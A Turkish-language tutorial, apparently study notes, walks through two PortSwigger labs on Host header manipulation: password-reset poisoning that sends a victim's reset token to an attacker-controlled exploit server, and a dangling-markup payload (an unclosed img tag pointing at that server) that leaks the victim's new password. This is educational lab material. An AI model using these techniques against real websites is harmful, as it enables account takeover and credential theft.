<h1 align="center">Host Header Manipulations</h1>


# Host Header Manipulation

* Sözlük
    * host header: Http requestindeki host header sunucunun domain ismini belirtir;

```html
GET / HTTP/1.1
Host: example.com
```
* host header kullanıldığında sunucu hangi uygulamaya ulaşılmaya çalışıldığını anlar ve bu headerdaki bilgiye göre bu gelen istek doğru uygulamaya yönlendirilir. Hatırlarsak reverse proxy bu işi yapıyordu. Yani **reverse proxy** ya da diğer adıyla **load balancer** sayesinde gelen ipler ve istekler doğrultusunda uygun sunuculara ya da uygulamalara aktarım yapılıyordu. Şimdi bu giden iplerin host bilgileri düzenleyerek kendi lehimize kullanabildiğimizi düşünelim. Evet bu sayede host bilgisi çalışacaktır ancak bir saldırgan da  bu olurken izleyici konumunda olup verilere ulaşabilecektir. 



**HHM**, bir http requestindeki **Host headerını** editleyerek sunucunun farklı şekilde davranmasını sağlayan bir web zafiyetidir. 

## Alıştırma #1

* https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning bu alıştırmaya gelelim.

* Bu alıştırmadaki uygulamanın şifre değiştirme kısmında bir zafiyet varmış. carlos kullanıcısı emailindeki her linke tıklıyormuş. Bizden de carlosun bu hareketlerinden yararlanarak onun hesabına giriş yapmamızı istiyor.

* Siteye girelim ve forgot password diyelim ve **wiener** yazalım;

![alt text](<WebSec101 0x13_ss/image.png>)

* Şimdi bu şifre yenileme isteğimiz **explot server** kısmındaki **email-clients** bölümünde gözüküyor olacak; 

![alt text](<WebSec101 0x13_ss/image-1.png>)

* Burp suite üzerinden **POST password request querymiz**i bulalım ve repeater'a yollayalım;

![alt text](<WebSec101 0x13_ss/image-2.png>)

* Görüldüğü üzere aşağıda kullanıcı adı yazıyor ve yukarı kısımda da host header'ı var. Şimdi bu host header'a **abcd123** rastgele değerini yazıp send tuşuna basalım; 

![alt text](<WebSec101 0x13_ss/image-3.png>)

* Tekrardan email kısmına bakarsak şifre sıfırlama isteğinin bir daha geldiğini görebileceğiz. Bundan da görülüyor ki host değerini değiştirsek de işlev bozulmuyor. Dolayısıyla header kısmına takip edebileceğimiz bir host değeri yazarsak ve aşağıdaki isim kısmına da carlos yazarsak carlosun şifre değiştirme talebini görebilir ve o bilgiyi kullanabiliriz.

* Şimdi **exploit server** kısmındaki URL adresini bu şekilde seçerek kopyalama işlemi yapalım;

![alt text](<WebSec101 0x13_ss/image-4.png>)

* Bu url'yi de burp suite'deki host yerine yapıştıralım;

![alt text](<WebSec101 0x13_ss/image-5.png>)

* Aşağıdaki wiener yazan yeri de carlos ile değiştirelim;

![alt text](<WebSec101 0x13_ss/image-6.png>)

* Send tuşuna basalım ve exploit server kısmına gelip aşağıdan Access-Log kısmına bakalım;

![alt text](<WebSec101 0x13_ss/image-8.png>)

* Yukarıdaki gibi tek farklı ip satırını bulalım ve o satır üzerindeki tokeni kopyalayalım ve bir yerde tutalım.

* Sonra email kısmına gelip orada bize verilen şifre değiştirme bağlantısını da kopyalayalım;

![alt text](<WebSec101 0x13_ss/image-9.png>)

* Bu url'yi yeni sekmeye yapıştırıp token kısmını access logdan aldığımızla değiştirelim; 

![alt text](<WebSec101 0x13_ss/image-10.png>)

* Enter'a basalım ve gelen ekranda şifreyi değiştirelim;

![alt text](<WebSec101 0x13_ss/image-11.png>)

* Sonra değiştirdiğimiz şifre ile carlosun hesabına girelim ve labı çözelim;

![alt text](<WebSec101 0x13_ss/image-12.png>)

* Burada aslında şifre değiştirme fonksiyonunu kullandık ve bu requesti yakalayıp içeriğini değiştirdik. Değiştirdiğimiz bu içerikte şifre değiştirme talebini carlos yapmış gibi gösterdik ve bu talebi tıklandığında görmemiz için host urlsini değiştirdik. carlos kullanıcısı da emailine gelen her linke tıkladığı için access logda onun yaptığı etkileşimden carlosa verilen tokeni görebildik ve kopyaladık. Sonra da bu tokeni kullanarak şifre değiştirme işlemi yaptık ve aslında carlosun şifresini biz değiştirmiş olduk.


# Alıştırma #2

* Sözlük

    * Dangling Markup: Belgenin yapısını bozan tamamlanmamış veya yanlış şekilde konulmuş html veya xml taglarını belirtir. 

* https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup bu sefer bu alıştırmaya geliyoruz. Bir önceki ile neredeyse aynı fakat bu sefer farklı bir teknik kullanmamız gerekiyor.    

* Alıştırmaya girelim ve wiener kullanıcısının parolasını sıfırlama talebi gönderelim;

![alt text](<WebSec101 0x13_ss/image-13.png>)

* Şimdi exploit server'dan email client'a bakalım ve emailin içeriğini görelim;

![alt text](<WebSec101 0x13_ss/image-14.png>)

* **View raw** tuşuna basıp tam kodu görelim;

![alt text](<WebSec101 0x13_ss/image-15.png>)
 
* Görüldüğü üzere burada sunucu şifre değiştirme talebi gönderildiğinde rastgele bir parola veriyor. Bundan önce ise bir **a tagı** görüyoruz. Buradan a tagının değerini değiştirebiliriz. Bu değer de parolayı taşıyan bir url olmalı. 

* Bu tagı;

```
payload: '></a> <img src="https://exploit-0a8a00bd04e1a6aaa1e0b810012800da.exploit-server.net/exploit
``` 

* bu şekilde değiştirerek bir url'e dönüştürebiliriz. Buradaki url'i de **exploit server** kısmından aldık. 

* Burada ilk baştaki **a tagını** kapadık ve sonrasında **img tagı** açıp **src özelliği** ekledik. Bu özelliğin içine de exploit server'daki url adresini girdik ki carlos gelen maile tıkladığında access logdan takip edebilelim.

* Şimdi carlos adına parola değiştirme işlemi yapıp bu requesti burp suite'den yakalayalım ve repeater'a yollayalım;

![alt text](<WebSec101 0x13_ss/image-16.png>)

* Host alanını şu şekilde değiştirelim; 

![alt text](<WebSec101 0x13_ss/image-19.png>)

* Buradaki host değerininin sonuna **:80** ekledikten sonra ***'></a> <img src="https://exploit-0a8a00bd04e1a6aaa1e0b810012800da.exploit-server.net/exploit/?a=*** kodunu girdik. :80 eklememizin sebebi URL parser'ın 80 portundan önceki kısmını doğrulamasıyla ilgilidir. Yani biz hosttan sonra img tagı açabilmemiz için parserın bundan önceki host bilgisini okuması gerekiyor. :80'den sonra ise kendi kodumuzu girebiliyor haldeyiz ve dikkat edersek img tagını hiç kapatmıyoruz ki oradaki host bilgisi sunucu tarafından okunsun. 

* Şimdi send tuşuna basalım ve exploit server'dan access loga bakalım; 

![alt text](<WebSec101 0x13_ss/image-20.png>)

* Carlos kullanıcısının şifresi geldi. Şimdi bu şifreyle carlosun hesabına girelim ve labı çözelim.

* Bu alıştırmada **dangling markups**'a dair kullanılan yöntemleri gördük. Bu zafiyeti kullanarak var olan tagları **escape** ettik ve yeni tag açarak onu da kapatmadık. Sonuçta yeni açtığımız taga kendi url hostumuzu girdik ve karşıdaki kullanıcının hareketlerini izleyebildik. Bu sayede carlos adına şifre değiştirme talebinde bulunulduğunda carlos linkle etkileşime geçtiği için sunucunun carlosa olan yanıtını ve dolayısıyla şifresinigörebildik.


# KAYNAK

[Web Security 0x13 | Host Header Manipulations
](https://www.youtube.com/watch?v=I6LZ6e5O-Ao&list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT&index=17)


